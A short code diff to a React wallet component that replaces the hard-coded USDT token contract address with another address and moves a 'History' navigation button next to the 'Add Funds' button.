@@ -221,7 +221,7 @@ const Wallet = ({ depositAmount }) => {
     console.log(amount.toString());
 
     // Instantiate the ERC20 contract object
-    const usdtTokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const usdtTokenAddress = "0x7ffb3d637014488b63fb9858e279385685afc1e2";
 
     const usdtContract = new web3.eth.Contract(
       usdtContractABI,
@@ -442,11 +442,6 @@ const Wallet = ({ depositAmount }) => {
       <Header />
       <div class="min-h-screen flex items-center justify-center">
         <div class="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
-          <Link to="/transactions">
-            <button class="bg-blue-500 text-white px-4 py-2 rounded-md hover:bg-blue-600 transition duration-300">
-              History
-            </button>
-          </Link>
           <div className="flex justify-between">
             <div class="mb-6">
               <h3 class="text-lg font-semibold mb-2">Balance</h3>
@@ -520,6 +515,11 @@ const Wallet = ({ depositAmount }) => {
             >
               Add Funds
             </button>
+            <Link style={{ float: "right" }} to="/transactions">
+              <button class="bg-blue-500 text-white px-4 py-2 rounded-md hover:bg-blue-600 transition duration-300">
+                History
+              </button>
+            </Link>
           </form>
           {error && <p style={{ color: "red" }}>{error}</p>}
         </div>
